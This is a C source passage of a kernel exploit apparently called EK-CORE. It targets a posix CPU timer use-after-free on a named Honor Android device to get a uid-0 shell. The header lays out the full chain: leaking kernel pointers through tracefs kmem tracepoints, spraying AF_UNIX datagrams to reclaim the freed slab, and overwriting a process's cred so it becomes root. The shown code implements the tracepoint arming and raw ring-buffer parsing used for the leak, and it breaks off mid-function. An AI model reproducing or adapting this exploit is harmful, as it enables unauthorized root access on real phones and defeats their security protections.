/*
 * EK-CORE - posix CPU timer UAF -> uid-0 shell
 *
 * Target : Honor WinRT "AAK-AN00" (port of the dada exploit)
 * Build  : 11.0.0.110 (SP5C00E110R102P2) / MagicOS 11.0 / Android 17
 * Kernel : 6.6.118-android15-8-g554929766a0d-abogki544555896-4k
 * SELinux: Enforcing (u:r:shell:s0)
 * Patches: the 6.6 android15-6.6 2026-07 branch still has
 *          exit_itimers()/posix_cpu_timers_exit() in fs/exec.c and no
 *          posixtimer_exec(), so the UAF is present.
 *
 * Chain (ported from woshigenm/EK-CORE uid0.c, MIT):
 *   1. leak the direct-map base and the victim k_itimer address V from the
 *      hidden kmem tracepoints via the per-CPU trace_pipe_raw files
 *      (raw records carry real pointers; /trace is hashed);
 *   2. spray 8 KiB AF_UNIX datagrams so the freed order-1 posix_timers_cache
 *      slab page is reclaimed with a payload that is all zeros except
 *      rb_left = S;
 *   3. reap the zombie -> cleanup_timerqueue() -> timerqueue_del() ->
 *      rb_erase() case 1-left writes [S] = 0 exactly once;
 *   4. S = cred + 8 of a child that exec'd this binary, i.e. a real private
 *      cred whose SELinux blob is valid. uid/gid become 0, then
 *      setresuid(0,0,0) + execve("/system/bin/sh").
 *
 * Nothing is written to any partition. Every unverified state parks the
 * process instead of reaping, because an uncontrolled rb_erase on the stale
 * node panics the kernel.
 */
#define _GNU_SOURCE
#include <errno.h>

/* MagicRoot 的 6.12 链路不用 tracefs 的 enable 写权限：
 * event id 是 0444 可读，直接 perf_event_open(PERF_TYPE_TRACEPOINT) 读 ring。
 * 6.12 分支编译成 perf 优先（EXTRACTKIT_PERF_FIRST=1），其余分支保持
 * tracefs 优先、perf 兜底。*/
#ifndef EXTRACTKIT_PERF_FIRST
#define EXTRACTKIT_PERF_FIRST 0
#endif

#ifndef EXTRACTKIT_FAMILY_ID
#define EXTRACTKIT_FAMILY_ID "generic"
#endif

#define LOW21_EQ(a, b) ((unsigned long long)((a) > (b) ? (a) - (b) : (b) - (a)) <= 0x40ULL)
#include <poll.h>
#include <pthread.h>
#include <dirent.h>
#include <fcntl.h>
#include <sched.h>
#include <signal.h>
#include <stdarg.h>
#include <stdatomic.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/prctl.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <linux/perf_event.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <time.h>
#include <unistd.h>

#define TR "/sys/kernel/tracing"
#define PAGE 4096UL
#define SOCKBUF 8192
#define SPRAY_THREADS 8
#define SPRAY_SOCKS 2048
#define SPRAY_PRE 2000
#define SPRAY_POST 10000
#define MAX_SOCKS 2048

/*
 * call site 软匹配（默认开）。
 *
 * 三处 call site 是 _RET_IP_ & 0x1fffff，属于"代码布局"常量：换一个内核 build
 * 就变，BTF / kallsyms 都给不出来。但它们本来就只是**收窄条件** —— 每条记录都
 * 同时有尺寸过滤（k_itimer 0x108 / cred 0xb8->0xc0 / task_struct 0x12c0），
 * 尺寸来自 BTF，是自适应的。
 *
 * 血的教训：site 填 0 会让下面的 `site != 0` 短路，等于"无过滤"，0x108/0x12c0 这类
 * 尺寸根本不唯一，写入对象会选错 → 直接 panic。所以默认**严格**。
 * 只有在确认目标尺寸唯一时才用 EXTRACTKITKIT_SOFT_SITE=1 打开软匹配。
 */
static int g_site_soft = 0;
/* 1 = cfg 里没有内核 text 符号（第三方二进制提取 / 服务器未收录）。
 * 此时只靠「结构偏移 + 尺寸类 + 堆喷」走默认写 cred 的路径：
 * 不写 selinux_state、不碰 panic_on_warn、也不做 fake-cred（那条必须有 slide）。*/
static int g_offsets_only = 0;
/* 允许外部指定 worker 脚本：App 用它把别的链路（如 EK-CALIB 注入）放进 root 子进程跑 */
static const char *g_stage_path;   /* 默认严格：尺寸不唯一，site 才是真判别条件 */
/* 目标根管理器的包名：App 通过 EXTRACTKIT_MGR 传进来，ksu_stage.sh 用它
 * 决定扫描哪个 lib 目录、以及 late-load 的 --package-name。
 * 写死 com.sukisu.ultra 时，选 MilkSU/KernelSU Next 等分支管理器会「提权成功
 * 但管理器显示未工作」——驱动注册的包名和用户选的不一致。 */
static char g_mgr_pkg[64] = "com.sukisu.ultra";
static char g_mgr_env[96] = "EXTRACTKIT_MGR=com.sukisu.ultra";
static int g_site_fallback_logged;
static uint64_t g_cred_exact, g_cred_loose;
static uint64_t g_cred_exact_site, g_cred_loose_site;

/* 只保留包名合法字符：字母/数字/点/下划线；空或全被过滤掉则回落默认。
 * 这样它拼进 shell 命令或 envp 都不会被空格/分号/引号带跑。 */
static void mgr_sanitize(const char *raw)
{
	size_t n = 0;

	if (raw && raw[0]) {
		for (; *raw && n < sizeof(g_mgr_pkg) - 1; raw++) {
			char c = *raw;

			if ((c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z') ||
			    (c >= '0' && c <= '9') || c == '.' || c == '_')
				g_mgr_pkg[n++] = c;
		}
		g_mgr_pkg[n] = 0;
	}
	if (!g_mgr_pkg[0])
		snprintf(g_mgr_pkg, sizeof(g_mgr_pkg), "%s", "com.sukisu.ultra");
	snprintf(g_mgr_env, sizeof(g_mgr_env), "EXTRACTKIT_MGR=%s", g_mgr_pkg);
}
static uint64_t g_slide;
/* 外部标定（EK-CALIB 标定器/第三方）给的 KASLR slide；非 0 时优先于本地 call_site 推导。 */
static uint64_t g_slide_env;

#ifndef EXTRACTKIT_PERMISSIVE_FIRST
#define EXTRACTKIT_PERMISSIVE_FIRST 0
#endif
#ifndef EXTRACTKIT_PERMISSIVE_ONLY
#define EXTRACTKIT_PERMISSIVE_ONLY 0
#endif


#ifndef EXTRACTKIT_SCHED_SLIDE
#define EXTRACTKIT_SCHED_SLIDE 0
#endif


#ifndef EXTRACTKIT_AIO_PLANT
#define EXTRACTKIT_AIO_PLANT 0
#endif
#ifndef EXTRACTKIT_AIO_RINGS
#define EXTRACTKIT_AIO_RINGS 128
#endif


#include "device_config.h"

#ifndef EXPECT_KERNEL
#define EXPECT_KERNEL ""
#endif
/* 按「内核分支」编一份时用这个：只比较版本前缀，例如 "6.6."。
   同一分支内结构偏移可能不同，那是 device.cfg 的职责；分支内**事件布局**
   相同，所以按分支编一份就够，不必每颗内核一份。 */
#ifndef EXPECT_FAMILY
#define EXPECT_FAMILY ""
#endif
#include "runtime_cfg.h"
#include "ksu_stage.h"
#include "trace_layout.h"

/* 嗅探模式下缓存下来的字段偏移（-1 = 还没找到）*/
static int g_sniff_site = -1;


static int g_sniff_ptr = -1;


/* Temporary-su daemon shipped with the GhostLock 64560 backend. The App checks
 * for it after the exploit exits, so the uid-0 shell hands root over to it. */
/* Temporary-su helper used only by the legacy shell/daemon modes. */
#define SU_PATH "/data/local/tmp/cve-64560-su"

#define CHILD_HELLO 0x52445931
#define CHILD_MAGIC 0x50474552

struct ev {
	unsigned type;
	unsigned id;
	int pid;
	uint64_t site, ptr, req, alloc;
	uint64_t pfn;
	unsigned order;
	uint64_t gfp;
};

struct child_report {
	int magic;
	int uid, euid;
	int setuid_ret, setuid_errno;
	int ruid, reuid, rsuid;
};

static _Atomic int g_go, g_stop, g_locker_started, g_locker_cpu;
static _Atomic int g_exec_tid, g_target_tgid;
static void *g_frag_base;
static size_t g_frag_len;
static int g_ready_w = -1, g_ack_r = -1, g_tid_w = -1;
static int g_cpu;

static uint64_t g_task_obj;

static uint64_t slabinfo_task_obj(void)
{
	FILE *f = fopen("/proc/slabinfo", "r");
	char line[256];
	uint64_t res = 0;

	if (!f)
		return 0;
	/* 头部两行是注释与表头 */
	if (!fgets(line, sizeof(line), f) || !fgets(line, sizeof(line), f)) {
		fclose(f);
		return 0;
	}
	while (fgets(line, sizeof(line), f)) {
		char name[64];
		unsigned long active, total;
		unsigned int objsize;

		if (sscanf(line, "%63s %lu %lu %u", name, &active, &total,
			   &objsize) != 4)
			continue;
		if (!strcmp(name, "task_struct")) {
			res = objsize;
			break;
		}
	}
	fclose(f);
	return res;
}

static uint64_t g_base;
static int g_held;
static int g_rawfd[8];
static unsigned char *g_raw;
static size_t g_raw_cap;
static struct ev *g_evs;

static int g_logfd = -1;

static void logf(const char *fmt, ...)
{
	va_list ap, ap2;
	char line[1024];
	int n;

	va_start(ap, fmt);
	vprintf(fmt, ap);
	va_end(ap);
	(void)fflush(stdout);

	/* adb dies with the device on a panic, so keep a durable copy: the
	 * reboot is the only way to clean up, and we must be able to read the
	 * log afterwards. */
	if (g_logfd < 0) {
		g_logfd = open("/data/local/tmp/ek-core.log",
			       O_WRONLY | O_CREAT | O_APPEND | O_CLOEXEC, 0644);
		if (g_logfd < 0)
			return;
	}
	va_start(ap2, fmt);
	n = vsnprintf(line, sizeof(line), fmt, ap2);
	va_end(ap2);
	if (n > 0) {
		if (n > (int)sizeof(line) - 1)
			n = (int)sizeof(line) - 1;
		(void)write(g_logfd, line, (size_t)n);
		(void)fsync(g_logfd);
	}
}

static int wr(const char *path, const char *val)
{
	int fd = open(path, O_WRONLY | O_CLOEXEC);
	ssize_t n;

	if (fd < 0)
		return -1;
	n = write(fd, val, strlen(val));
	close(fd);
	return n == (ssize_t)strlen(val) ? 0 : -1;
}

static void pin(int cpu)
{
	cpu_set_t set;

	CPU_ZERO(&set);
	CPU_SET(cpu, &set);
	(void)sched_setaffinity(0, sizeof(set), &set);
}

static inline uint32_t u32(const unsigned char *b, size_t o)
{
	uint32_t v;

	memcpy(&v, b + o, 4);
	return v;
}

static inline uint64_t u64(const unsigned char *b, size_t o)
{
	uint64_t v;

	memcpy(&v, b + o, 8);
	return v;
}

/* 让 rss_stat 真的发生一次：trigger 里的 enable_event 只有在持有者的
 * 事件命中时才会执行。ROD2-W09 上进程 RSS 一直没变，rss_stat 一次都不
 * 触发，kmem 事件就永远没被打开（表现为 recs=19、timer_allocs=0）。 */
static void force_rss(void)
{
	size_t n = 4u << 20;
	char *p = mmap(NULL, n, PROT_READ | PROT_WRITE,
		       MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);

	if (p == MAP_FAILED)
		return;
	for (size_t i = 0; i < n; i += PAGE)
		p[i] = 1;
	munmap(p, n);
}

static int collect_kmem_events(char *buf, size_t bufsz, const char **out, int max)
{
	DIR *d = opendir(TR "/events/kmem");
	struct dirent *de;
	char *p = buf;
	int n = 0;

	if (!d)
		return 0;
	while ((de = readdir(d)) != NULL && n < max) {
		const char *nm = de->d_name;
		size_t l;

		if (nm[0] == '.')
			continue;
		/* 只认这三类：分配、释放、页事件；具体后缀由内核决定（noprof/node 等） */
		if (strncmp(nm, "kmem_cache_alloc", 16) &&
		    strncmp(nm, "mm_page_", 8) &&
		    strcmp(nm, "kmem_cache_free"))
			continue;
		l = strlen(nm) + 1;
		if ((size_t)(p - buf) + l > bufsz)
			break;
		memcpy(p, nm, l);
		out[n++] = p;
		p += l;
	}
	closedir(d);
	return n;
}

/* 页级事件（mm_page_alloc/free）是否真的挂上了。
 * 挂不上时，burst 里等 stream 永远不会来记录 —— 直接跳过等待。*/
static int g_page_armed;

static void scan_event_ids(void);

static void enable_events(void)
{
	static const char *fallback_events[] = {
		"kmem_cache_alloc", "kmem_cache_free",
		"mm_page_alloc", "mm_page_free"
	};
	char namebuf[1024];
	const char *events[24];
	size_t ne;
	/* 两个持有者：rss_stat（靠 force_rss 触发一次）与 sched_switch
	 * （系统里永远在触发），任一命中就会把 kmem 事件真正打开。 */
	static const char *holders[] = {
		"/events/kmem/rss_stat",
		"/events/sched/sched_switch",
	};
	char cmd[96], path[128], en[128];
	int ok = 0, bad = 0;
	size_t nh = sizeof(holders) / sizeof(holders[0]);
	ne = (size_t)collect_kmem_events(namebuf, sizeof(namebuf), events, 24);
	if (ne == 0) {
		for (size_t i = 0; i < sizeof(fallback_events) / sizeof(fallback_events[0]); i++)
			events[i] = fallback_events[i];
		ne = sizeof(fallback_events) / sizeof(fallback_events[0]);
	}
	logf("[trace] kmem candidates=%zu\n", ne);

	for (size_t h = 0; h < nh; h++) {
		int hok = 0, hen = -1;
		snprintf(path, sizeof(path), TR "%s/trigger", holders[h]);
		for (size_t i = 0; i < ne; i++) {
			int e;

			snprintf(cmd, sizeof(cmd), "enable_event:kmem:%s",
				 events[i]);
			int rc = wr(path, cmd);
			e = errno; /* 立刻取走：后面的 close/fopen 会把 errno 改掉 */
			if (rc == 0 || e == EEXIST) {
				if (!strncmp(events[i], "mm_page_", 8))
					g_page_armed++;
			}
			if (rc == 0) {
				ok++;
				hok++;
			} else if (e == EEXIST) {
				/* 之前某次运行已经开过；规则仍然有效 */
				ok++;
				hok++;
				logf("[trace] %s: %s already armed\n",
				     holders[h], events[i]);
			} else {
				bad++;
				logf("[trace] %s: %s denied (errno=%d)\n",
				     holders[h], events[i], e);
			}
		}
		snprintf(en, sizeof(en), TR "%s/enable", holders[h]);
		hen = wr(en, "1");
		if (hen == 0)
			ok++;
		else
			bad++;
		logf("[trace] holder %s armed=%d/%zu self_enable=%d\n",
		     holders[h], hok, ne, hen);
	}
	force_rss();
	/* 规则已生效，立刻撤掉 sched_switch 这条腿：它每秒上万条记录，
	 * 会把 ring buffer 冲爆，顶掉 UAF 抢占窗口里真正需要的 free 记录
	 * （ROD2 用不上也无害，PPG 上则是致命噪声）。 */
	(void)wr(TR "/events/sched/sched_switch/enable", "0");
	(void)wr(TR "/events/sched/sched_switch/trigger", "0");

	/* 有的内核没有可用持有者，但事件本身可以直接 enable；这条路也试一次。 */
	for (size_t i = 0; i < ne; i++) {
		snprintf(en, sizeof(en), TR "/events/kmem/%s/enable", events[i]);
		int rc = wr(en, "1");
		if (rc != 0)
			logf("[trace] direct %s enable denied (errno=%d)\n",
			     events[i], errno);
	}
	scan_event_ids();
	logf("[trace] enable ok=%d fail=%d\n", ok, bad);
	/* 回读状态：判断是「写被拒」还是「写了但没开」。 */
	{
		char buf[16];
		int fd;
		snprintf(en, sizeof(en), TR "/events/kmem/mm_page_alloc/enable");
		fd = open(en, O_RDONLY | O_CLOEXEC);
		if (fd >= 0) {
			ssize_t n = read(fd, buf, sizeof(buf) - 1);
			close(fd);
			if (n > 0) {
				buf[n] = 0;
				for (ssize_t k = 0; k < n; k++)
					if (buf[k] == '\n') buf[k] = 0;
				logf("[trace] mm_page_alloc/enable reads '%s'\n", buf);
			}
		} else {
			logf("[trace] mm_page_alloc/enable unreadable (errno=%d)\n",
			     errno);
		}
	}
	/* Probe whether the node-path tracepoint exists on this build; the
	 * task_struct allocation goes through it, so its absence decides how
	 * the fake-cred stage locates `current`. */
	logf("[probe] kmem_cache_alloc_node enable=%d\n",
	     wr(TR "/events/kmem/kmem_cache_alloc_node/enable", "1"));
}

static void drain_cpu(int cpu)
{
	char path[128];
	unsigned char tmp[4096];
	int fd;

	snprintf(path, sizeof(path), TR "/per_cpu/cpu%d/trace_pipe_raw", cpu);
	fd = open(path, O_RDONLY | O_NONBLOCK | O_CLOEXEC);
	if (fd < 0)
		return;
	while (read(fd, tmp, sizeof(tmp)) > 0)
		;
	close(fd);
}

static void trace_start(void)
{
	(void)wr(TR "/tracing_on", "0");
	(void)wr(TR "/trace", "");
	for (int c = 0; c < 8; c++)
		drain_cpu(c);
	(void)wr(TR "/tracing_on", "1");
}

static void trace_stop(void)
{
	/* 收尾：先关 rss_stat 触发器，再把挂过的事件关掉，最后停 tracing。
	 * 之前只关 tracing_on，事件一直处于 enable 状态，下次运行会看到
	 * 一堆 "already armed"，而且内核 ring buffer 一直有人往里写。*/
	(void)wr(TR "/events/kmem/rss_stat/trigger", "0");
	(void)wr(TR "/events/kmem/rss_stat/enable", "0");
	(void)wr(TR "/events/sched/sched_switch/enable", "0");
	(void)wr(TR "/events/sched/sched_switch/trigger", "0");
	static const char *nm[] = {
		"kmem_cache_alloc", "kmem_cache_alloc_node", "kmem_cache_alloc_noprof",
		"kmem_cache_alloc_node_noprof", "kmem_cache_free", "mm_page_alloc",
		"mm_page_free", "mm_page_pcpu_drain", "mm_page_alloc_extfrag",
		"mm_page_alloc_zone_locked", "mm_page_free_batched"
	};
	char path[192];

	for (size_t i = 0; i < sizeof(nm) / sizeof(nm[0]); i++) {
		snprintf(path, sizeof(path), TR "/events/kmem/%s/enable", nm[i]);
		(void)wr(path, "0");
	}
	(void)wr(TR "/tracing_on", "0");
}

static long read_cpu(int cpu, unsigned char *buf, size_t cap)
{
	char path[128];
	size_t total = 0;
	int fd;

	snprintf(path, sizeof(path), TR "/per_cpu/cpu%d/trace_pipe_raw", cpu);
	fd = open(path, O_RDONLY | O_NONBLOCK | O_CLOEXEC);
	if (fd < 0)
		return -1;
	while (total < cap) {
		ssize_t n = read(fd, buf + total, cap - total);

		if (n <= 0)
			break;
		total += (size_t)n;
	}
	close(fd);
	return (long)total;
}

static int g_ncpu = 1;

/* cred 分配可能落在任何一个 CPU 上（fork 由调度器挑核），只读 g_cpu 在
 * 8 核机器上会漏掉 7/8 的记录。这里按 cpu0..g_ncpu-1 依次 non-blocking
 * 读，容量用满即停。*/
static long read_all_cpus(unsigned char *buf, size_t cap)
{
	long total = 0;

	for (int c = 0; c < g_ncpu && (size_t)total < cap; c++) {
		long n = read_cpu(c, buf + total, cap - (size_t)total);

		if (n > 0)
			total += n;
	}
	return total;
}


static void ensure_raw(void)
{
	for (int c = 0; c < 8; c++) {
		char path[128];

		if (g_rawfd[c] >= 0)
			continue;
		snprintf(path, sizeof(path), TR "/per_cpu/cpu%d/trace_pipe_raw",
			 c);
		g_rawfd[c] = open(path, O_RDONLY | O_NONBLOCK | O_CLOEXEC);
	}
}

static long read_fd(int fd, unsigned char *buf, size_t cap)
{
	size_t total = 0;

	if (fd < 0)
		return 0;
	while (total < cap) {
		ssize_t n = read(fd, buf + total, cap - total);

		if (n <= 0)
			break;
		total += (size_t)n;
	}
	return (long)total;
}

/* 运行时事件 id 表。
 * 为什么需要：/sys/kernel/tracing/events/kmem/<name>/format 在部分机型上
 * 读不到（SELinux 拒绝），此时分类只能靠形状猜，而形状猜不出
 * mm_page_*（page 指针 / pfn / order 与 kmem_cache_alloc 的
 * site / ptr / req / alloc 完全同位置不同类型）。
 * 但 /events/kmem/<name>/id 是 0444（MagicRoot 也是这么读的），
 * 所以在挂事件后把每个名字的真实 id 读回来，直接按 id 分类。
 * 字段布局来自内核镜像自带的 format 字串（6.6.118 与 6.12.58 两份
 * Image 都是 "page=%p pfn=0x%lx order=%d ..."），即 pfn@8 order@16。*/
static unsigned g_id_alloc, g_id_free, g_id_pa, g_id_pf, g_id_pfb, g_id_pd;

static unsigned read_event_id(const char *name)
{
	char path[128];
	char buf[32];
	int fd, n;

	snprintf(path, sizeof(path),
		 "/sys/kernel/tracing/events/kmem/%s/id", name);
	fd = open(path, O_RDONLY);
	if (fd < 0) {
		snprintf(path, sizeof(path),
			 "/sys/kernel/debug/tracing/events/kmem/%s/id", name);
		fd = open(path, O_RDONLY);
		if (fd < 0)
			return 0;
	}
	n = (int)read(fd, buf, sizeof(buf) - 1);
	close(fd);
	if (n <= 0)
		return 0;
	buf[n] = 0;
	return (unsigned)strtoul(buf, NULL, 10);
}

static void scan_event_ids(void)
{
	g_id_alloc = read_event_id("kmem_cache_alloc");
	g_id_free  = read_event_id("kmem_cache_free");
	g_id_pa    = read_event_id("mm_page_alloc");
	g_id_pf    = read_event_id("mm_page_free");
	g_id_pfb   = read_event_id("mm_page_free_batched");
	g_id_pd    = read_event_id("mm_page_pcpu_drain");
	logf("[ids] alloc=%u free=%u pa=%u pf=%u pfb=%u drain=%u%s\n",
	     g_id_alloc, g_id_free, g_id_pa, g_id_pf, g_id_pfb, g_id_pd,
	     (g_id_alloc || g_id_pa || g_id_pf) ? "" : " (no kmem id)");
}

/* 按运行时 id 分类；返回 1 表示已处理。*/
static int ev_by_id(unsigned type, const unsigned char *b, size_t p,
		    size_t end, struct ev *e)
{
	if (!type)
		return 0;
	if (type == g_id_pa) {
		if (p + OFF_ORDER + 4 > end)
			return 0;
		memset(e, 0, sizeof(*e));
		e->type = EV_PAGE_ALLOC;
		e->id = type;
		e->pid = (int)u32(b, p + 4);
		e->pfn = u64(b, p + OFF_PFN);
		e->order = u32(b, p + OFF_ORDER);
		return 1;
	}
	if (type == g_id_pf || type == g_id_pfb || type == g_id_pd) {
		if (p + OFF_ORDER + 4 > end)
			return 0;
		memset(e, 0, sizeof(*e));
		e->type = (type == g_id_pd) ? EV_PCPU_DRAIN : EV_PAGE_FREE;
		e->id = type;
		e->pid = (int)u32(b, p + 4);
		e->pfn = u64(b, p + OFF_PFN);
		e->order = u32(b, p + OFF_ORDER);
		return 1;
	}
	if (type == g_id_alloc || type == g_id_free) {
		if (p + OFF_ALLOC + 8 > end)
			return 0;
		memset(e, 0, sizeof(*e));
		e->type = (type == g_id_free) ? EV_CACHE_FREE : EV_CACHE_ALLOC;
		e->id = type;
		e->pid = (int)u32(b, p + 4);
		e->site = u64(b, p + OFF_SITE);
		e->ptr = u64(b, p + OFF_PTR);
		e->req = u64(b, p + OFF_REQ);
		e->alloc = u64(b, p + OFF_ALLOC);
		if (e->type == EV_CACHE_ALLOC && !e->req && !e->alloc && e->ptr)
			e->type = EV_CACHE_FREE;
		return 1;
	}
	return 0;
}

static int parse_events(const unsigned char *b, size_t n, struct ev *out,
			int max)
{
	int cnt = 0;

	for (size_t base = 0; base + 16 <= n; base += PAGE) {
		uint64_t commit = u64(b, base + 8);
		size_t o, end;

		if (!commit || commit > PAGE)
			continue;
		o = base + 16;
		end = base + 16 + commit;
		if (end > base + PAGE)
			end = base + PAGE;
		while (o + 4 <= end) {
			uint32_t hdr = u32(b, o);
			unsigned type_len = hdr & 31;
			unsigned time_delta = hdr >> 5;
			size_t total, p;
			int is_data = 0;
			unsigned type;

			if (type_len == 29) {
				if (!time_delta)
					break;
				total = 4 + u32(b, o + 4);
			} else if (type_len == 30 || type_len == 31) {
				total = 8;
			} else if (type_len == 0) {
				total = 4 + u32(b, o + 4);
				is_data = 1;
			} else {
				total = 4 + type_len * 4;
				is_data = 1;
			}
			if (total < 4)
				break;
			/* type_len==29 是「扩展记录」：头部 4 字节 + 4 字节长度，
			 * 正文从 o+8 开始；type_len==0 同样是 8 字节头。
			 * mm_page_alloc 带 gfp_flags 字符串，正文超过 112 字节时
			 * 一定走扩展记录 —— 以前按 o+4 取正文，把长度字段当成
			 * 事件 id，整条记录被丢掉，所以 order1_pages 一直为 0。*/
			p = o + ((type_len == 0 || type_len == 29) ? 8 : 4);
			if (is_data && p + 8 <= end && cnt < max) {
				type = u32(b, p) & 0xffff;
				if (ev_by_id(type, b, p, end, &out[cnt])) {
					cnt++;
				} else if (g_lay_n > 0) {
					/* 有 format 表就完全按内核自报的偏移切，
					 * 不再假设 6.x 的字段排列。*/
					const struct evlay *L = lay_for(type);

					if (!L)
						goto next;
					{
						struct ev *e = &out[cnt];
						const struct lay_field *f = &L->f;

						memset(e, 0, sizeof(*e));
						e->id = type;
						e->pid = (int)u32(b, p + 4);
						switch (L->kind) {
						case LK_CACHE_ALLOC:
							e->type = EV_CACHE_ALLOC;
							break;
						case LK_CACHE_FREE:
							e->type = EV_CACHE_FREE;
							break;
						case LK_PAGE_ALLOC:
							e->type = EV_PAGE_ALLOC;
							break;
						case LK_PAGE_FREE:
							e->type = EV_PAGE_FREE;
							break;
						default:
							e->type = EV_PCPU_DRAIN;
							break;
						}
						if (f->has_site &&
						    p + (size_t)f->site + 8 <= end)
							e->site = u64(b, p + f->site);
						/* format 里没有 call_site（或者这个事件
						 * 本来就是 *_noprof 之类不带 site 的变体）：
						 * 用字节嗅探补，别让 base 校准拿到 0。*/
						if (!f->has_site && TIMER_SITE_LOW21 &&
						    e->type == EV_CACHE_ALLOC &&
						    g_sniff_site < 0) {
							int so = -1;
							int po = -1;

							if (lay_sniff_offsets(
								    b + p,
								    (size_t)(end - p),
								    TIMER_SITE_LOW21,
								    &so, &po)) {
								g_sniff_site = so;
								g_sniff_ptr = po;
								logf("[lay] sniff site_off=%d ptr_off=%d (no site in format)\n",
								     so, po);
							}
						}
						if (!f->has_site && g_sniff_site >= 0 &&
						    p + (size_t)g_sniff_site + 8 <= end)
							lay_raw_capture(b, p, (size_t)(end - p));
						if (g_lay_raw_n <= 3) {
							logf("[raw] id=%u", type);
							for (int w = 0; w < LAY_RAW_WORDS; w++)
								logf(" %llx", (unsigned long long)
								     g_lay_raw[g_lay_raw_n - 1][w]);
							logf("\n");
						}
						if (g_sniff_site >= 0)
						e->site = u64(b, p + g_sniff_site);
						if (f->has_ptr &&
						    p + (size_t)f->ptr + 8 <= end)
							e->ptr = u64(b, p + f->ptr);
						if (f->has_req &&
						    p + (size_t)f->req + 8 <= end)
							e->req = u64(b, p + f->req);
						if (f->has_alloc &&
						    p + (size_t)f->alloc + 8 <= end)
							e->alloc = u64(b, p + f->alloc);
						if (f->has_pfn &&
						    p + (size_t)f->pfn + 8 <= end)
							e->pfn = u64(b, p + f->pfn);
						if (f->has_order &&
						    p + (size_t)f->order + 4 <= end)
							e->order = u32(b, p + f->order);
						cnt++;
					}
				} else if (g_lay_n == -2) {
					/* 嗅探模式：用期望的 call_site low21 在
					 * 记录里定位 site / ptr，不假设字段顺序。*/
					if (g_sniff_site < 0) {
						int so = -1;
						int po = -1;

						if (lay_sniff_offsets(
							    b + p, (size_t)(end - p),
							    TIMER_SITE_LOW21, &so, &po)) {
							g_sniff_site = so;
							g_sniff_ptr = po;
							logf("[lay] sniff site_off=%d "
							     "ptr_off=%d\n", so, po);
						}
					}
					if (g_sniff_site < 0)
						goto next;
					{
						struct ev *e = &out[cnt];

						memset(e, 0, sizeof(*e));
						e->id = type;
						e->pid = (int)u32(b, p + 4);
						if (g_sniff_site >= 0)
						e->site = u64(b, p + g_sniff_site);
						lay_raw_capture(b, p, (size_t)(end - p));
						if (g_lay_raw_n <= 3) {
							logf("[raw] id=%u", type);
							for (int w = 0; w < LAY_RAW_WORDS; w++)
								logf(" %llx", (unsigned long long)
								     g_lay_raw[g_lay_raw_n - 1][w]);
							logf("\n");
						}
						e->ptr = u64(b, p + g_sniff_ptr);
						/* site 命中后，同一记录体里 site+16 / site+24
						 * 就是 bytes_req / bytes_alloc（6.x 布局），
						 * 不填它们 cred 扫描会因 sizes(0) 全空。*/
						{
							unsigned rq = (unsigned)u32(
								b, p + g_sniff_site + 16);
							/* 6.x: req@site+16、alloc@site+24
							 * 5.10: req@site+16、alloc@site+20（u32 紧邻），
							 *       site+24 已经是 gfp。用「谁等于 req」判定。*/
							unsigned al20 = (unsigned)u32(
								b, p + g_sniff_site + 20);
							unsigned al24 = (unsigned)u32(
								b, p + g_sniff_site + 24);
							unsigned al = (al20 == rq) ? al20 : al24;

							if (type == EV_PAGE_ALLOC ||
							    type == EV_PAGE_FREE ||
							    type == EV_PCPU_DRAIN) {
								/* 页事件：site 后面紧跟 pfn，
								 * 再 8 字节是 order。不填这两项，
								 * burst 永远等不到 free_seen。*/
								e->pfn = u64(
									b, p + g_sniff_ptr);
								e->order = (int)u32(
									b, p + g_sniff_ptr + 8);
								e->type = type;
							} else if (rq && rq >= 0x10 && al >= rq && al <= rq + 0x80 &&
							    rq <= 0x4000) {
								e->req = rq;
								e->alloc = al;
								e->type = EV_CACHE_ALLOC;
							} else if (!rq && !al) {
								/* 释放事件没有 bytes_req/bytes_alloc，
								 * 且本机 id 不等于 EV_CACHE_FREE（实测 4694
								 * 条 req=alloc=0 全被当成 alloc）。按形状认。*/
								/* 释放事件没有 bytes_req，
								 * 只能靠 id 区分，否则 UAF 窗口
								 * 永远等不到 free_seen。*/
								e->type = EV_CACHE_FREE;
							} else {
								/* 没有 bytes_req/bytes_alloc 的 kmem 记录
								 * 只能是释放（kmem_cache_free 无这
								 * 两个字段，实测本机 1071 条）。*/
								e->type = EV_CACHE_FREE;
							}
						}
						e->id = type;
						cnt++;
					}
				} else if (type == EV_CACHE_ALLOC) {
					struct ev *e = &out[cnt];

					if (p + OFF_ALLOC + 8 > end)
						goto next;
					e->type = type;
					e->id = type;
					e->pid = (int)u32(b, p + 4);
					e->site = u64(b, p + OFF_SITE);
					e->ptr = u64(b, p + OFF_PTR);
					e->req = u64(b, p + OFF_REQ);
					e->alloc = u64(b, p + OFF_ALLOC);
					/* 同一 id 下也会混入释放记录（req=alloc=0），
					 * 按形状认成 free，否则 free_seen 永远等不到。*/
					if (!e->req && !e->alloc && e->ptr)
						e->type = EV_CACHE_FREE;
					cnt++;
				} else if (type == EV_PAGE_ALLOC) {
					struct ev *e = &out[cnt];

					e->id = type;

					if (p + OFF_ORDER + 8 > end)
						goto next;
					e->type = type;
					e->pid = (int)u32(b, p + 4);
					/* mm_page_alloc 的字段顺序随版本变过：
					 * 新内核是 pfn(0) / page(8) / order(16)，
					 * 老内核是 page(0) / pfn(8) / order(16)。
					 * pfn 是小整数（< 2^40），page 是指针
					 * （0xffff….），按这个区分，别写死。*/
					/* 以内核自己打印的格式为准（6.6.118 / 6.12.58 两份 Image
					 * 里的 format 字串都是
					 *   "page=%p pfn=0x%lx order=%d migratetype=%d gfp_flags=%s"
					 * 即 page@0, pfn@8, order@16, migratetype@20, gfp@24。）
					 * 不要再按「谁像小整数」猜。*/
					e->pfn = u64(b, p + OFF_PFN);
					e->order = u32(b, p + OFF_ORDER);
					e->gfp = u64(b, p + 32);
					cnt++;
				} else if (type == EV_PAGE_FREE ||
					   type == EV_PCPU_DRAIN) {
					struct ev *e = &out[cnt];

					e->id = type;

					if (p + OFF_ORDER + 4 > end)
						goto next;
					e->type = type;
					e->pid = (int)u32(b, p + 4);
					/* 以内核自己打印的格式为准（6.6.118 / 6.12.58 两份 Image
					 * 里的 format 字串都是
					 *   "page=%p pfn=0x%lx order=%d migratetype=%d gfp_flags=%s"
